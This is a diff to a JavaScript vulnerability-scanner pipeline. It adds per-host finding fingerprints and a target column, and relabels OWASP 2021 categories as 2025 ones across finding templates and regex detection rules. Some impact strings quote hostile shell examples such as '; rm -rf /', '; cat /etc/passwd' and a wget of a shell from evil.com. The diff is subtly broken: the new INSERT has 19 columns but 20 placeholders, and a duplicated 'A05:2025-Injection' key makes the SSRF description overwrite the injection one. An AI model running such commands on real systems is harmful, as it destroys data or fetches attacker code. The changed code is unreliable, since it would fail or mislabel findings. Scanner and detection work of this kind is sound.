@@ -32,9 +32,14 @@ function findingFingerprint(finding) {
   const file = String(evidence.file || '').replace(/\\/g, '/').toLowerCase()
   const line = evidence.line || ''
   const cwe = String(finding.cweId || finding.cwe || '').toLowerCase()
+  // Include host so the same finding on different hosts isn't deduplicated away
+  const host = (() => {
+    const raw = finding.target || evidence.url || ''
+    try { return new URL(raw).hostname.toLowerCase() } catch { return String(raw).toLowerCase() }
+  })()
   const category = /jwt|token|api.?key|secret|credential/i.test(finding.title || '') ? 'credential'
     : /sql injection|raw query|query interpolation/i.test(finding.title || '') ? 'sql-injection' : String(finding.title || '').toLowerCase()
-  return `${cwe}|${file}|${line}|${category}`
+  return `${cwe}|${file}|${line}|${category}|${host}`
 }
 
 export function getRootDomain(hostname) {
@@ -138,6 +143,11 @@ export class UnifiedPipeline {
 
   /** Persist a finding through the standard enrichment chain. Returns stored record. */
   async ingestFinding(scanId, rawFinding, { verify = true, targetType = 'url' } = {}) {
+    // 0. Ensure target/asset is set for per-finding attribution
+    if (!rawFinding.target) {
+      const scan = db.get(`SELECT target FROM scans WHERE id = ?`, scanId)
+      rawFinding.target = scan?.target || rawFinding.evidence?.url || ''
+    }
     // 1. OWASP enrich
     let f = enrichWithOwasp(rawFinding)
     // 2. RAG PoC cross-reference
@@ -179,8 +189,8 @@ export class UnifiedPipeline {
     const now = new Date().toISOString()
     try {
       db.run(
-        `INSERT INTO findings (id, scan_id, title, severity, cvss, cwe_id, cve_id, owasp_category, description, layman_impact, remediation, module, status, evidence, poc, agent_verdict, fingerprint, created_at)
-         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
+        `INSERT INTO findings (id, scan_id, title, severity, cvss, cwe_id, cve_id, owasp_category, description, layman_impact, remediation, module, status, evidence, poc, agent_verdict, fingerprint, target, created_at)
+         VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
         id, scanId, f.title || 'Untitled finding', f.severity || 'info',
         f.cvss ?? SEVERITY_SCORE[f.severity] ?? 0, f.cweId || f.cwe || null, f.cveId || null,
         f.owaspCategory || null, f.description || '', f.laymanImpact || null, f.remediation || '',
@@ -188,6 +198,7 @@ export class UnifiedPipeline {
         JSON.stringify(f.evidence || {}), JSON.stringify(f.poc || {}),
         verdict ? JSON.stringify({ agent: verdict.agent, confidence: verdict.confidence, reasoning: verdict.verdict }) : null,
         fingerprint,
+        f.target || null,
         now
       )
       const stored = db.get(`SELECT * FROM findings WHERE id = ?`, id)
@@ -338,7 +349,7 @@ export class UnifiedPipeline {
             severity: s.sev,
             cveId: s.cve,
             cweId: 'CWE-119',
-            owaspCategory: 'A06:2021-Vulnerable and Outdated Components',
+            owaspCategory: 'A03:2025-Software Supply Chain Failures',
             description: `nmap NSE script "${s.name}" reports the target is VULNERABLE. This is a scanner-confirmed, remotely exploitable condition.`,
             remediation: 'Patch the affected service immediately; if patching is impossible, isolate the service behind a firewall.',
             module: 'offensive:service-probe',
@@ -365,7 +376,7 @@ export class UnifiedPipeline {
         title: `Authentication surface exposed — ${u.slice(0, 110)}`,
         severity: 'low',
         cweId: 'CWE-284',
-        owaspCategory: 'A07:2021-Identification and Authentication Failures',
+        owaspCategory: 'A07:2025-Authentication Failures',
         description: `A login/authentication endpoint was discovered at ${u}. It is a candidate for credential attacks (password spraying, default credentials, brute-force) and should enforce MFA, rate-limiting, and lockout.`,
         remediation: 'Enforce MFA, CAPTCHA after N failures, IP-based rate limiting, and strong password policy on all authentication surfaces.',
         module: 'offensive:login-surface',
@@ -430,7 +441,7 @@ export class UnifiedPipeline {
               title: `${label} (${matches.length} found)`,
               severity: 'critical',
               cweId: 'CWE-200',
-              owaspCategory: 'A01:2021-Broken Access Control',
+              owaspCategory: 'A01:2025-Broken Access Control',
               description: `${label} found in response body at ${url}. This is a critical information disclosure that may allow full compromise.`,
               remediation: 'Never embed secrets in client-side responses. Use server-side env vars and rotate all exposed keys immediately.',
               module: 'response-body-scan',
@@ -447,7 +458,7 @@ export class UnifiedPipeline {
             title: `Internal IP disclosure (${new Set(ipMatches).size} unique)`,
             severity: 'medium',
             cweId: 'CWE-200',
-            owaspCategory: 'A05:2021-Security Misconfiguration',
+            owaspCategory: 'A02:2025-Security Misconfiguration',
             description: `Internal IP addresses found in response body at ${url}: ${[...new Set(ipMatches)].slice(0, 5).join(', ')}. Helps attackers map internal network.`,
             remediation: 'Remove internal IPs from public-facing responses.',
             module: 'response-body-scan',
@@ -461,7 +472,7 @@ export class UnifiedPipeline {
             title: `Debug/error information exposed in response`,
             severity: 'medium',
             cweId: 'CWE-209',
-            owaspCategory: 'A05:2021-Security Misconfiguration',
+            owaspCategory: 'A02:2025-Security Misconfiguration',
             description: `Stack trace or debug info found in response at ${url}. Discloses internal paths, framework versions, and code structure.`,
             remediation: 'Disable debug mode and custom error pages in production.',
             module: 'response-body-scan',
@@ -478,7 +489,7 @@ export class UnifiedPipeline {
               title: `Sensitive information in HTML comments (${sensitive.length} comments)`,
               severity: 'low',
               cweId: 'CWE-615',
-              owaspCategory: 'A05:2021-Security Misconfiguration',
+              owaspCategory: 'A02:2025-Security Misconfiguration',
               description: `HTML comments at ${url} contain potentially sensitive info: ${sensitive.slice(0, 3).map(c => c.slice(0, 120)).join(' | ')}`,
               remediation: 'Remove sensitive comments from production HTML.',
               module: 'response-body-scan',
@@ -518,7 +529,7 @@ export class UnifiedPipeline {
             title: `Insecure cookie flags — missing ${issues.join(', ')}`,
             severity: 'medium',
             cweId: 'CWE-614',
-            owaspCategory: 'A07:2021-Identification and Authentication Failures',
+            owaspCategory: 'A07:2025-Authentication Failures',
             description: `Cookies set by ${base} are missing ${issues.join(', ')}. Without Secure, cookies transmit over HTTP. Without HttpOnly, JS can steal them. Without SameSite, CSRF is easier.`,
             remediation: 'Set Secure, HttpOnly, and SameSite=Lax/Strict on all session cookies.',
             module: 'cookie-audit',
@@ -535,7 +546,7 @@ export class UnifiedPipeline {
           title: `CORS: Access-Control-Allow-Origin: *`,
           severity: 'low',
           cweId: 'CWE-942',
-          owaspCategory: 'A05:2021-Security Misconfiguration',
+          owaspCategory: 'A02:2025-Security Misconfiguration',
           description: `CORS allows any origin (*) at ${base}. While credentials won't be sent, this allows any site to read public API responses.`,
           remediation: 'Restrict ACAO to specific trusted origins. Never use * with credentials.',
           module: 'cors-audit',
@@ -546,7 +557,7 @@ export class UnifiedPipeline {
           title: `CORS with credentials enabled — ${acao}`,
           severity: 'medium',
           cweId: 'CWE-942',
-          owaspCategory: 'A05:2021-Security Misconfiguration',
+          owaspCategory: 'A02:2025-Security Misconfiguration',
           description: `CORS allows origin "${acao}" with credentials at ${base}. If this origin is not fully trusted, it enables cross-origin authenticated requests.`,
           remediation: 'Verify the allowed origin is fully trusted. Prefer explicit origin validation over wildcards.',
           module: 'cors-audit',
@@ -568,7 +579,7 @@ export class UnifiedPipeline {
             title: `HTML forms discovered — ${forms.length} injection surfaces`,
             severity: 'info',
             cweId: 'CWE-200',
-            owaspCategory: 'A03:2021-Injection',
+            owaspCategory: 'A05:2025-Injection',
             description: `${forms.length} HTML forms with ${forms.reduce((s,f) => s + f.inputs.length, 0)} input fields found at ${base}. Every form field is a potential injection vector.`,
             remediation: 'Ensure all form inputs are validated and sanitized server-side.',
             module: 'form-harvest',
@@ -733,7 +744,7 @@ export class UnifiedPipeline {
         title: `Subdomain enumeration — ${subs.size} subdomains discovered`,
         severity: 'info',
         cweId: 'CWE-200',
-        owaspCategory: 'A05:2021-Security Misconfiguration',
+        owaspCategory: 'A02:2025-Security Misconfiguration',
         description: `DNS enumeration discovered ${subs.size} subdomains for ${rootDomain}. Each subdomain expands the attack surface and should be inventoried. Subdomains: ${subList.join(', ')}`,
         remediation: 'Ensure all subdomains are inventoried and decommission unused ones. Review each for security posture.',
         module: 'subdomain-enum',
@@ -796,7 +807,7 @@ export class UnifiedPipeline {
           title: `${title} — ${url}`,
           severity: 'medium',
           cweId: 'CWE-200',
-          owaspCategory: 'A05:2021-Security Misconfiguration',
+          owaspCategory: 'A02:2025-Security Misconfiguration',
           description: `API documentation is publicly accessible at ${url}. This discloses the full API surface (endpoints, parameters, auth schemes) to attackers.`,
           remediation: 'Restrict access to API documentation (auth, IP allowlist) in production.',
           module: 'api-discovery',
@@ -939,7 +950,7 @@ export class UnifiedPipeline {
             title: `Missing Security Headers (${missing.length})`,
             severity: sev,
             cweId: 'CWE-693',
-            owaspCategory: 'A05:2021-Security Misconfiguration',
+            owaspCategory: 'A02:2025-Security Misconfiguration',
             description: `The target ${targetUrl} is missing ${missing.length} recommended HTTP security headers: ${missing.join(', ')}. This weakens defenses against clickjacking, MIME-sniffing, and XSS.`,
             remediation: 'Configure the web server to send: Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.',
             module: 'http-headers',
@@ -951,7 +962,7 @@ export class UnifiedPipeline {
             title: `Server Header Information Disclosure (${headers['server']})`,
             severity: 'info',
             cweId: 'CWE-200',
-            owaspCategory: 'A05:2021-Security Misconfiguration',
+            owaspCategory: 'A02:2025-Security Misconfiguration',
             description: `The server advertises banner details: ${headers['server']}`,
             remediation: 'Suppress or obfuscate the Server HTTP header.',
             module: 'http-headers',
@@ -1006,7 +1017,7 @@ export class UnifiedPipeline {
                 title: 'Exposed Git Repository (/.git/HEAD)',
                 severity: 'high',
                 cweId: 'CWE-538',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Exposed Git directory discovered at ${checkUrl}. Attackers can download the entire source code history.`,
                 remediation: 'Block access to /.git in your web server configuration.',
                 module: 'path-enum',
@@ -1017,7 +1028,7 @@ export class UnifiedPipeline {
                 title: `Exposed Environment Credentials File (${p})`,
                 severity: 'critical',
                 cweId: 'CWE-200',
-                owaspCategory: 'A01:2021-Broken Access Control',
+                owaspCategory: 'A01:2025-Broken Access Control',
                 description: `Exposed environment file at ${checkUrl} containing sensitive credentials/secrets.`,
                 remediation: 'Remove public access to the .env file immediately and rotate all secrets it contains.',
                 module: 'path-enum',
@@ -1028,7 +1039,7 @@ export class UnifiedPipeline {
                 title: 'Exposed Git Config (/.git/config)',
                 severity: 'high',
                 cweId: 'CWE-538',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Git config exposed at ${checkUrl} — may disclose repo remotes and branch info; combined with /.git/HEAD the full source can often be reconstructed.`,
                 remediation: 'Block access to /.git in your web server configuration.',
                 module: 'path-enum',
@@ -1039,7 +1050,7 @@ export class UnifiedPipeline {
                 title: `Exposed Backup/Database Dump (${p})`,
                 severity: 'critical',
                 cweId: 'CWE-530',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `A backup archive or SQL dump is publicly downloadable at ${checkUrl} (${text.length} bytes). This typically exposes full source code or database contents including credentials.`,
                 remediation: 'Remove backup artifacts from the web root immediately and rotate any credentials they contain.',
                 module: 'path-enum',
@@ -1050,7 +1061,7 @@ export class UnifiedPipeline {
                 title: 'phpinfo() Page Exposed',
                 severity: 'medium',
                 cweId: 'CWE-200',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `phpinfo() at ${checkUrl} discloses PHP version, loaded modules, paths, and environment variables.`,
                 remediation: 'Delete phpinfo.php from production.',
                 module: 'path-enum',
@@ -1061,7 +1072,7 @@ export class UnifiedPipeline {
                 title: `Spring Boot Actuator Exposed (${p})`,
                 severity: 'high',
                 cweId: 'CWE-200',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Spring Actuator endpoint ${checkUrl} is publicly accessible — provides a full JVM heap dump with potential memory credentials.`,
                 remediation: 'Restrict actuator endpoints to management port/internal network and require authentication.',
                 module: 'path-enum',
@@ -1072,7 +1083,7 @@ export class UnifiedPipeline {
                 title: `Spring Boot Actuator Exposed (${p})`,
                 severity: p.includes('env') ? 'high' : 'medium',
                 cweId: 'CWE-200',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Spring Actuator endpoint ${checkUrl} is publicly accessible — can disclose env vars, beans, mappings, or system metadata.`,
                 remediation: 'Restrict actuator endpoints to management port/internal network and require authentication.',
                 module: 'path-enum',
@@ -1083,7 +1094,7 @@ export class UnifiedPipeline {
                 title: 'Apache server-status Exposed',
                 severity: 'medium',
                 cweId: 'CWE-200',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `mod_status page at ${checkUrl} discloses requests, vhosts, and internal IPs.`,
                 remediation: 'Disable mod_status or restrict to localhost.',
                 module: 'path-enum',
@@ -1094,7 +1105,7 @@ export class UnifiedPipeline {
                 title: `Sensitive Laravel Log File Exposed (${p})`,
                 severity: 'medium',
                 cweId: 'CWE-538',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Laravel log file publicly accessible at ${checkUrl} (${text.length} bytes) — discloses application stack traces, queries, and internal state.`,
                 remediation: `Block public access to storage logs in web server configuration.`,
                 module: 'path-enum',
@@ -1105,7 +1116,7 @@ export class UnifiedPipeline {
                 title: `Application Metrics Endpoint Exposed (${p})`,
                 severity: 'low',
                 cweId: 'CWE-200',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Prometheus/application metrics publicly accessible at ${checkUrl} — discloses operational statistics.`,
                 remediation: `Restrict access to metrics endpoints.`,
                 module: 'path-enum',
@@ -1116,7 +1127,7 @@ export class UnifiedPipeline {
                 title: `Go Expvar Debug Variables Exposed (${p})`,
                 severity: 'medium',
                 cweId: 'CWE-200',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Go debug/vars endpoint exposed at ${checkUrl} disclosing internal runtime variables.`,
                 remediation: `Disable expvar in production.`,
                 module: 'path-enum',
@@ -1127,7 +1138,7 @@ export class UnifiedPipeline {
                 title: 'robots.txt Discovered',
                 severity: 'info',
                 cweId: 'CWE-200',
-                owaspCategory: 'A05:2021-Security Misconfiguration',
+                owaspCategory: 'A02:2025-Security Misconfiguration',
                 description: `Discovered robots.txt containing crawler directives:\n${text.slice(0, 300)}`,
                 remediation: 'Ensure robots.txt does not disclose sensitive administrative endpoints.',
                 module: 'path-enum',
@@ -1536,16 +1547,16 @@ export class UnifiedPipeline {
   _patternScan(files) {
     // ── Layman-impact explanations per vulnerability category ──
     const IMPACT = {
-      'A03:2021-Injection': 'An attacker can inject malicious commands or code into the application. For SQL injection, this means reading/modifying/deleting the entire database — including stealing all user passwords, credit card numbers, and private data. For command injection, the attacker can run any command on the server, potentially taking full control of the machine.',
-      'A01:2021-Broken Access Control': 'A normal user can access someone else\'s data or perform admin-only actions just by changing a number in the URL (e.g. /user/1 → /user/2). An attacker can view, modify, or delete other users\' private information, or escalate to admin privileges without authorization.',
-      'A02:2021-Cryptographic Failures': 'Sensitive data like passwords, session tokens, or personal information is not properly protected. An attacker who intercepts network traffic or gains access to the database can read passwords in plain text, impersonate users, or decrypt supposedly secure communications.',
-      'A04:2021-Insecure Design': 'The application lacks proper security controls by design. Missing rate limiting allows attackers to try thousands of passwords per second. Missing validation allows malicious file uploads or impossible data values. These are structural flaws that cannot be fixed by patching a single line of code.',
-      'A05:2021-Security Misconfiguration': 'The server or application is set up insecurely. Debug pages leak internal paths and secrets. Default admin passwords are still in use. Unnecessary features are enabled. CORS misconfiguration allows any website to make authenticated requests on behalf of your users. An attacker can exploit these oversights to gain deeper access.',
-      'A06:2021-Vulnerable and Outdated Components': 'The application uses libraries or frameworks with known security vulnerabilities. Attackers can use publicly available exploits to compromise the application without needing to find a new vulnerability — they just run an existing attack script.',
-      'A07:2021-Identification and Authentication Failures': 'The login system is weak. An attacker can brute-force passwords (try thousands of combinations until one works), use default credentials (admin/admin), or steal session tokens to impersonate legitimate users. Without multi-factor authentication, a single leaked password grants full access.',
-      'A08:2021-Software and Data Integrity Failures': 'The application trusts external data without verification. Unsafe deserialization lets attackers send crafted data that executes code when the application reads it. An attacker can achieve remote code execution by uploading a malicious serialized object or tampering with a software update.',
-      'A09:2021-Security Logging and Monitoring Failures': 'No one is watching for attacks. Without proper logging, a breach can go undetected for months. Attackers can brute-force passwords, exfiltrate data, or maintain persistent access without triggering any alerts. There is no audit trail to investigate what happened after an incident.',
-      'A10:2021-Server-Side Request Forgery (SSRF)': 'The server can be tricked into making requests to internal systems that are normally firewalled off. An attacker can scan internal networks, access cloud metadata services (AWS/GCP/Azure) to steal credentials, or attack internal APIs that are not exposed to the internet.',
+      'A05:2025-Injection': 'An attacker can inject malicious commands or code into the application. For SQL injection, this means reading/modifying/deleting the entire database — including stealing all user passwords, credit card numbers, and private data. For command injection, the attacker can run any command on the server, potentially taking full control of the machine.',
+      'A01:2025-Broken Access Control': 'A normal user can access someone else\'s data or perform admin-only actions just by changing a number in the URL (e.g. /user/1 → /user/2). An attacker can view, modify, or delete other users\' private information, or escalate to admin privileges without authorization.',
+      'A04:2025-Cryptographic Failures': 'Sensitive data like passwords, session tokens, or personal information is not properly protected. An attacker who intercepts network traffic or gains access to the database can read passwords in plain text, impersonate users, or decrypt supposedly secure communications.',
+      'A06:2025-Insecure Design': 'The application lacks proper security controls by design. Missing rate limiting allows attackers to try thousands of passwords per second. Missing validation allows malicious file uploads or impossible data values. These are structural flaws that cannot be fixed by patching a single line of code.',
+      'A02:2025-Security Misconfiguration': 'The server or application is set up insecurely. Debug pages leak internal paths and secrets. Default admin passwords are still in use. Unnecessary features are enabled. CORS misconfiguration allows any website to make authenticated requests on behalf of your users. An attacker can exploit these oversights to gain deeper access.',
+      'A03:2025-Software Supply Chain Failures': 'The application uses libraries or frameworks with known security vulnerabilities. Attackers can use publicly available exploits to compromise the application without needing to find a new vulnerability — they just run an existing attack script.',
+      'A07:2025-Authentication Failures': 'The login system is weak. An attacker can brute-force passwords (try thousands of combinations until one works), use default credentials (admin/admin), or steal session tokens to impersonate legitimate users. Without multi-factor authentication, a single leaked password grants full access.',
+      'A08:2025-Software or Data Integrity Failures': 'The application trusts external data without verification. Unsafe deserialization lets attackers send crafted data that executes code when the application reads it. An attacker can achieve remote code execution by uploading a malicious serialized object or tampering with a software update.',
+      'A09:2025-Security Logging and Alerting Failures': 'No one is watching for attacks. Without proper logging, a breach can go undetected for months. Attackers can brute-force passwords, exfiltrate data, or maintain persistent access without triggering any alerts. There is no audit trail to investigate what happened after an incident.',
+      'A05:2025-Injection': 'The server can be tricked into making requests to internal systems that are normally firewalled off. An attacker can scan internal networks, access cloud metadata services (AWS/GCP/Azure) to steal credentials, or attack internal APIs that are not exposed to the internet.',
     }
 
     // Helper: check if rule applies to this file based on extension
@@ -1553,96 +1564,96 @@ export class UnifiedPipeline {
     const ALL = () => true // applies to all files
 
     const RULES = [
-      // ── A03:2021 — Injection (SQLi, CMDi, XSS, SSTI, LDAP, NoSQL, XPath) ──
-      { re: /(?:api[_-]?key|apikey|secret|password|passwd|token|private[_-]?key)\s*[:=]\s*['"][A-Za-z0-9_\-+/=]{16,}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Hardcoded secret/credential', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'A secret key or password is written directly in the source code. Anyone who can read the code — including attackers who gain access to the repository — can use this credential to access the database, API, or service it protects. If this code is in a public GitHub repo, the credential is already compromised.', ext: ALL },
-      { re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/, sev: 'critical', cwe: 'CWE-798', title: 'Private key committed to source', owasp: 'A07:2021-Identification and Authentication Failures', impact: 'A private cryptographic key is stored in the source code. This key can decrypt all communications, sign malicious software as trusted, or authenticate as the server to steal data. Anyone with this key can impersonate the application.', ext: ALL },
+      // ── A05:2025 — Injection (SQLi, CMDi, XSS, SSTI, LDAP, NoSQL, XPath) ──
+      { re: /(?:api[_-]?key|apikey|secret|password|passwd|token|private[_-]?key)\s*[:=]\s*['"][A-Za-z0-9_\-+/=]{16,}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Hardcoded secret/credential', owasp: 'A07:2025-Authentication Failures', impact: 'A secret key or password is written directly in the source code. Anyone who can read the code — including attackers who gain access to the repository — can use this credential to access the database, API, or service it protects. If this code is in a public GitHub repo, the credential is already compromised.', ext: ALL },
+      { re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/, sev: 'critical', cwe: 'CWE-798', title: 'Private key committed to source', owasp: 'A07:2025-Authentication Failures', impact: 'A private cryptographic key is stored in the source code. This key can decrypt all communications, sign malicious software as trusted, or authenticate as the server to steal data. Anyone with this key can impersonate the application.', ext: ALL },
       // SQL Injection patterns (only on files that actually do DB queries)
-      { re: /(?:query|execute|raw|queryRunner|getConnection|createQuery|createQueryBuilder)\s*\(\s*[`'"].*\$[\{\(]/, sev: 'high', cwe: 'CWE-89', title: 'SQL query built with string interpolation (SQLi risk)', owasp: 'A03:2021-Injection', impact: 'Database queries are built by directly inserting user input into the SQL string. An attacker can close the quote and add their own SQL commands — reading the entire database, modifying records, or deleting all data. This is the #1 most dangerous web vulnerability.', ext: ALL },
-      { re: /\.query\s*\(\s*(?!['"][^'"]*['"]\s*,\s*\[)/, sev: 'medium', cwe: 'CWE-89', title: 'Database query without parameterized binding', owasp: 'A03:2021-Injection', impact: 'The query does not appear to use parameterized/placeholder binding. If user input reaches this query, it is vulnerable to SQL injection — attackers can extract, modify, or destroy database contents.', ext: ALL },
-      { re: /mysql_query\s*\(\s*['"][^'"]*\$_(?:GET|POST|REQUEST)/, sev: 'critical', cwe: 'CWE-89', title: 'PHP SQL injection (mysql_query with superglobal)', owasp: 'A03:2021-Injection', impact: 'PHP code directly inserts user input ($_GET/$_POST) into a MySQL query string. An attacker can craft a URL parameter that extracts the entire database, including all user passwords and private data. This is trivially exploitable.', ext: f => extMatch(f, ['.php']) },
-      { re: /(?:select|insert|update|delete)\s+.*\+.*\b(?:req|request|params|query|body|input|param)\b/i, sev: 'high', cwe: 'CWE-89', title: 'SQL statement concatenated with user input', owasp: 'A03:2021-Injection', impact: 'An SQL query string is built by concatenating (+) with user-supplied data. Attackers can inject SQL commands to read all database tables, modify records, or drop the entire database.', ext: ALL },
+      { re: /(?:query|execute|raw|queryRunner|getConnection|createQuery|createQueryBuilder)\s*\(\s*[`'"].*\$[\{\(]/, sev: 'high', cwe: 'CWE-89', title: 'SQL query built with string interpolation (SQLi risk)', owasp: 'A05:2025-Injection', impact: 'Database queries are built by directly inserting user input into the SQL string. An attacker can close the quote and add their own SQL commands — reading the entire database, modifying records, or deleting all data. This is the #1 most dangerous web vulnerability.', ext: ALL },
+      { re: /\.query\s*\(\s*(?!['"][^'"]*['"]\s*,\s*\[)/, sev: 'medium', cwe: 'CWE-89', title: 'Database query without parameterized binding', owasp: 'A05:2025-Injection', impact: 'The query does not appear to use parameterized/placeholder binding. If user input reaches this query, it is vulnerable to SQL injection — attackers can extract, modify, or destroy database contents.', ext: ALL },
+      { re: /mysql_query\s*\(\s*['"][^'"]*\$_(?:GET|POST|REQUEST)/, sev: 'critical', cwe: 'CWE-89', title: 'PHP SQL injection (mysql_query with superglobal)', owasp: 'A05:2025-Injection', impact: 'PHP code directly inserts user input ($_GET/$_POST) into a MySQL query string. An attacker can craft a URL parameter that extracts the entire database, including all user passwords and private data. This is trivially exploitable.', ext: f => extMatch(f, ['.php']) },
+      { re: /(?:select|insert|update|delete)\s+.*\+.*\b(?:req|request|params|query|body|input|param)\b/i, sev: 'high', cwe: 'CWE-89', title: 'SQL statement concatenated with user input', owasp: 'A05:2025-Injection', impact: 'An SQL query string is built by concatenating (+) with user-supplied data. Attackers can inject SQL commands to read all database tables, modify records, or drop the entire database.', ext: ALL },
       // Command Injection patterns
-      { re: /\b(?:eval|exec|execSync|execFileSync|spawnSync|child_process\.exec|subprocess\.(?:call|check_output|Popen)|os\.(?:system|popen))\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)/, sev: 'high', cwe: 'CWE-78', title: 'Command execution with user-controlled input', owasp: 'A03:2021-Injection', impact: 'User input is passed directly to a system command. An attacker can inject shell commands (e.g., ; rm -rf / or ; cat /etc/passwd) to execute arbitrary code on the server, read sensitive files, or take full control of the machine.', ext: ALL },
-      { re: /\beval\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'eval() usage — possible code injection', owasp: 'A03:2021-Injection', impact: 'eval() executes a string as code. If any part of that string comes from user input, an attacker can run arbitrary JavaScript/Python on the server — accessing files, databases, environment variables, and escalating to full server compromise.', ext: ALL },
-      { re: /new\s+Function\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'new Function() — dynamic code execution', owasp: 'A03:2021-Injection', impact: 'new Function() creates and runs code from a string, similar to eval(). If user input reaches this, attackers can execute arbitrary JavaScript with full access to the application context.', ext: ALL },
-      { re: /shell_exec|passthru|system|popen|proc_open|exec\s*\(\s*\$_(?:GET|POST|REQUEST)/, sev: 'high', cwe: 'CWE-78', title: 'PHP command execution with user input', owasp: 'A03:2021-Injection', impact: 'PHP code passes user input directly to a shell command. An attacker can append ; cat /etc/passwd or ; wget http://evil.com/shell.php to run any command on the server with the web server\'s privileges.', ext: f => extMatch(f, ['.php']) },
-      { re: /require\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-98', title: 'PHP remote/local file inclusion via user input', owasp: 'A03:2021-Injection', impact: 'User input controls which file is loaded via require/include. An attacker can include remote files (RFI) or local system files (LFI) like /etc/passwd, leading to code execution or sensitive data disclosure.', ext: f => extMatch(f, ['.php']) },
+      { re: /\b(?:eval|exec|execSync|execFileSync|spawnSync|child_process\.exec|subprocess\.(?:call|check_output|Popen)|os\.(?:system|popen))\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.|input|user|data)/, sev: 'high', cwe: 'CWE-78', title: 'Command execution with user-controlled input', owasp: 'A05:2025-Injection', impact: 'User input is passed directly to a system command. An attacker can inject shell commands (e.g., ; rm -rf / or ; cat /etc/passwd) to execute arbitrary code on the server, read sensitive files, or take full control of the machine.', ext: ALL },
+      { re: /\beval\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'eval() usage — possible code injection', owasp: 'A05:2025-Injection', impact: 'eval() executes a string as code. If any part of that string comes from user input, an attacker can run arbitrary JavaScript/Python on the server — accessing files, databases, environment variables, and escalating to full server compromise.', ext: ALL },
+      { re: /new\s+Function\s*\(/, sev: 'medium', cwe: 'CWE-95', title: 'new Function() — dynamic code execution', owasp: 'A05:2025-Injection', impact: 'new Function() creates and runs code from a string, similar to eval(). If user input reaches this, attackers can execute arbitrary JavaScript with full access to the application context.', ext: ALL },
+      { re: /shell_exec|passthru|system|popen|proc_open|exec\s*\(\s*\$_(?:GET|POST|REQUEST)/, sev: 'high', cwe: 'CWE-78', title: 'PHP command execution with user input', owasp: 'A05:2025-Injection', impact: 'PHP code passes user input directly to a shell command. An attacker can append ; cat /etc/passwd or ; wget http://evil.com/shell.php to run any command on the server with the web server\'s privileges.', ext: f => extMatch(f, ['.php']) },
+      { re: /require\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-98', title: 'PHP remote/local file inclusion via user input', owasp: 'A05:2025-Injection', impact: 'User input controls which file is loaded via require/include. An attacker can include remote files (RFI) or local system files (LFI) like /etc/passwd, leading to code execution or sensitive data disclosure.', ext: f => extMatch(f, ['.php']) },
       // XSS patterns
-      { re: /innerHTML\s*=\s*(?!['"]<)/, sev: 'medium', cwe: 'CWE-79', title: 'innerHTML assignment — DOM XSS risk', owasp: 'A03:2021-Injection', impact: 'Setting innerHTML with untrusted data allows attackers to inject <script> tags that run in victims\' browsers. This can steal login cookies, redirect users to phishing sites, or deface the page. Any user visiting the page could have their account hijacked.', ext: ALL },
-      { re: /dangerouslySetInnerHTML/, sev: 'medium', cwe: 'CWE-79', title: 'React dangerouslySetInnerHTML — XSS risk', owasp: 'A03:2021-Injection', impact: 'React\'s dangerouslySetInnerHTML bypasses React\'s built-in XSS protection. If the content comes from user input, attackers can inject scripts that steal session tokens, log keystrokes, or perform actions as the victim.', ext: ALL },
-      { re: /document\.write\s*\(/, sev: 'low', cwe: 'CWE-79', title: 'document.write — DOM XSS risk', owasp: 'A03:2021-Injection', impact: 'document.write() can inject HTML/JavaScript into the page. If fed untrusted data, attackers can hijack user sessions, deface the page, or redirect victims to malicious sites.', ext: ALL },
-      { re: /v-html\s*=/i, sev: 'medium', cwe: 'CWE-79', title: 'Vue v-html directive — XSS risk', owasp: 'A03:2021-Injection', impact: 'Vue\'s v-html renders raw HTML. If the bound data comes from user input, attackers can inject malicious scripts that execute in every visitor\'s browser.', ext: ALL },
-      { re: /\{\{\{.*\}\}\}/, sev: 'medium', cwe: 'CWE-79', title: 'Handlebars triple-brace (unescaped HTML) — XSS risk', owasp: 'A03:2021-Injection', impact: 'Triple braces {{{ }}} in Handlebars render unescaped HTML. If the variable contains user input, attackers can inject <script> tags that steal cookies and hijack user sessions.', ext: ALL },
